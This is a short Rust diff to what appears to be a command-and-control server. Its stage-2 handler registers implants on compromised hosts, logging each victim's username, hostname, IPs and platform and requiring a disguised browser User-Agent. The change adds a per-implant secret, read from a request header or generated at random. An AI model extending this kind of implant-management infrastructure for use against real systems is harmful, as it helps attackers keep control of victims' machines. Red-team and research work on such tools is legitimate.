@@ -6,7 +6,7 @@ use std::path::PathBuf;
 use std::sync::{Arc, Mutex};
 use uuid::Uuid;
 
-use crate::links::Links;
+use crate::links::{Links, NewLink};
 
 /// User-Agent that all implants must present.
 const IMPLANT_UA: &str = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
@@ -160,14 +160,26 @@ pub async fn stage2_handler(
     let platform = truncate_field(body.platform.clone(), 64);
 
     let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());
-    let link = links.add_link(
+    // Extract the implant secret from the request headers
+    let secret = req
+        .headers()
+        .get("X-Client-ID")
+        .and_then(|v| v.to_str().ok())
+        .map(|s| s.to_string())
+        .unwrap_or_else(|| {
+            // Generate a fallback secret if not provided (for backward compatibility)
+            hex::encode(rand::random::<[u8; 32]>())
+        });
+
+    let link = links.add_link(NewLink {
         username,
         hostname,
         internal_ip,
         external_ip,
         platform,
-        body.pid,
-    );
+        pid: body.pid,
+        secret,
+    });
 
     let resp = TaskResponse {
         q: String::new(),
